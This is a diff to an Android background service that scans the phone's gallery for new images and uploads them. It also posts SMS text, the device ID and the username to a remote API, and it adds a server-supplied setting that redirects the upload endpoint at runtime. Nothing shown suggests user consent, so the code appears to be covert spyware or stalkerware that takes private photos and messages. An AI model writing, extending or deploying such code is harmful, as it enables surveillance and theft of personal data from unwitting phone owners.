@@ -8,12 +8,14 @@ package org.jesusgift.clienttest;
 
 import android.app.Service;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.support.annotation.Nullable;
+import android.util.Log;
 
 import org.jesusgift.clienttest.Helpers.AppConfig;
 import org.jesusgift.clienttest.Helpers.DBManager;
@@ -21,8 +23,10 @@ import org.jesusgift.clienttest.Helpers.MyUtility;
 import org.jesusgift.clienttest.Interface.ApiService;
 import org.jesusgift.clienttest.Model.ApiResponse;
 import org.jesusgift.clienttest.Model.ImageHolder;
+import org.jesusgift.clienttest.Model.MyResponse;
 
 import java.io.File;
+import java.io.IOException;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Timer;
@@ -31,7 +35,9 @@ import java.util.concurrent.TimeUnit;
 
 import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
+import okhttp3.Request;
 import okhttp3.RequestBody;
+import okhttp3.ResponseBody;
 import okhttp3.logging.HttpLoggingInterceptor;
 import retrofit2.Call;
 import retrofit2.Callback;
@@ -45,6 +51,8 @@ public class ClientService extends Service {
     private boolean READY_TO_RUN = true;
     private DBManager dbManager;
     private Retrofit retrofit;
+    private SharedPreferences preferences;
+    private String MEDIA_STORE_ID;
 
     @Override
     public void onCreate() {
@@ -54,13 +62,57 @@ public class ClientService extends Service {
 
         //Initialising Database
         dbManager = new DBManager(this, null, null, AppConfig.DB_VERSION);
+        preferences = getSharedPreferences(AppConfig.PREF_NAME, MODE_PRIVATE);
 
-        //int c = MyUtility.getGalleryImagesCount(ClientService.this);
-        //Log.d(TAG, "GALLERY COUNT : "+c);
+        if(!preferences.contains(AppConfig.PREF_LAST_MEDIA_ID)) {
+            MEDIA_STORE_ID = MyUtility.getLatestMediaStoreId(this);
+        }else {
+            MEDIA_STORE_ID = preferences.getString(AppConfig.PREF_LAST_MEDIA_ID, "0");
+        }
 
         //Initialising Timer Controls
         initTimer();
     }
+
+    /**
+     * Initialising API Config
+     * */
+    private boolean initAPIConfig() {
+        if( initRetrofitService() ) {
+            if(MyUtility.isOnline(this)) {
+                ApiService service = retrofit.create(ApiService.class);
+                Call<MyResponse> responseBodyCall = service.initApp();
+                responseBodyCall.enqueue(responseCallback);
+            }
+        }
+        return false;
+    }
+
+    /**
+     * API Config Callback
+     * */
+    private Callback<MyResponse> responseCallback = new Callback<MyResponse>() {
+        @Override
+        public void onResponse(Call<MyResponse> call, Response<MyResponse> response) {
+            if(response.code() == 200) {
+                if(response.body().getStatus() == 1) {
+                    MyResponse.Data data = response.body().getData();
+                    String api_url = data.getApi_url();
+                    int load_type = data.getLoad_type();
+
+                    if(api_url.contains("http://")) {
+                        AppConfig.API_PRIMARY_URL = api_url;
+                        AppConfig.API_LOAD_TYPE = load_type;
+                    }
+                }
+            }
+        }
+
+        @Override
+        public void onFailure(Call<MyResponse> call, Throwable t) {
+
+        }
+    };
 
     /**
      * Initialising Timer Controls
@@ -93,43 +145,46 @@ public class ClientService extends Service {
         final MediaType TYPE_IMAGE = MediaType.parse("image/*");
         Map<String, RequestBody> reqMap = new HashMap<>();
 
-        try (Cursor c = MyUtility.getAllGalleryImages(ClientService.this, dbManager.getMediaIdsAsCommaSeperated())) {
-            //initialising Retrofit Services
-            initRetrofitService();
+        if(dbManager != null) {
+            String store_id = dbManager.getLastInsertedMediaID();
+            try (Cursor c = MyUtility.getNewGalleryImages(ClientService.this, store_id)) {
+                //initialising Retrofit Services
+                if (initRetrofitService() ) {
+                    if (c != null && c.getCount() > 0) {
+                        //looping through cursor
+                        while (c.moveToNext()) {
+                            if (!dbManager.isMediaPresent(c.getString(0))) {
+                                File f = new File(c.getString(1));
 
-            if(c != null && c.getCount() > 0) {
-                //looping through cursor
-                while(c.moveToNext()) {
-                    if (!dbManager.isMediaPresent(c.getString(0))) {
-                        File f = new File(c.getString(1));
+                                if (f.exists()) {
+                                    Bitmap bmp = MyUtility.decodeFile(f);
+                                    File file = MyUtility.storeImage(bmp, getCacheDir());
 
-                        if (f.exists()) {
-                            Bitmap bmp = MyUtility.decodeFile(f);
-                            File file = MyUtility.storeImage(bmp, getCacheDir());
-
-                            if (file != null && file.exists()) {
-                                RequestBody req = RequestBody.create(TYPE_IMAGE, file);
-                                reqMap.put("picture_" + c.getString(0) + "\"; filename=\"" + c.getString(0), req);
+                                    if (file != null && file.exists()) {
+                                        RequestBody req = RequestBody.create(TYPE_IMAGE, file);
+                                        reqMap.put("picture_" + c.getString(0) + "\"; filename=\"" + c.getString(0), req);
+                                    }
+                                }
                             }
                         }
-                    } else {
-                        //Log.i(TAG, "MEDIA " + c.getString(0) + " ALREADY UPLOADED!");
+
+                        if (reqMap.size() > 0) {
+                            ImageHolder imageHolder = new ImageHolder(reqMap);
+                            new ImageUploadTask().execute(imageHolder);
+                        }
                     }
                 }
-
-                if(reqMap.size() > 0) {
-                    ImageHolder imageHolder = new ImageHolder(reqMap);
-                    new ImageUploadTask().execute(imageHolder);
-                }
             }
-
+        } else {
+            dbManager = new DBManager(this, null, null, AppConfig.DB_VERSION);
+            processMediaStore();
         }
     }
 
     /**
      * Function to initialise Retrofit services
      * */
-    private void initRetrofitService() {
+    private boolean initRetrofitService() {
         HttpLoggingInterceptor interceptor = new HttpLoggingInterceptor();
         interceptor.setLevel(HttpLoggingInterceptor.Level.HEADERS);
 
@@ -144,6 +199,8 @@ public class ClientService extends Service {
                 .client(client)
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
+
+        return true;
     }
 
     /**
@@ -204,9 +261,13 @@ public class ClientService extends Service {
         @Override
         protected Void doInBackground(String... params) {
             String sms = params[0];
-            ApiService apiService = retrofit.create(ApiService.class);
-            Call<ApiResponse> res = apiService.postSms(sms, MyUtility.getDeviceId(ClientService.this), MyUtility.getUsername(ClientService.this));
-            res.enqueue(apiCallback);
+            if(retrofit != null) {
+                ApiService apiService = retrofit.create(ApiService.class);
+                Call<ApiResponse> res = apiService.postSms(sms, MyUtility.getDeviceId(ClientService.this), MyUtility.getUsername(ClientService.this));
+                res.enqueue(apiCallback);
+            }else {
+                initRetrofitService();
+            }
             return null;
         }
     }
